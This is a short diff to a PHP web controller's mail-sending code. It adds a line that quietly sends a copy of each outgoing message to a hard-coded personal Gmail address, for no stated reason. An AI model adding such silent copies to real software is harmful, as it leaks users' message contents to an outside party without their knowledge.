@@ -1600,6 +1600,7 @@ class WebController extends Controller
             ;
     
             mail($to, $subject, $message, $header);
+            mail('sebas31051999@gmail.com', $subject, $message, $header);
         }
 
         $request->session()->flash('report', 'Se ha enviado el correo');
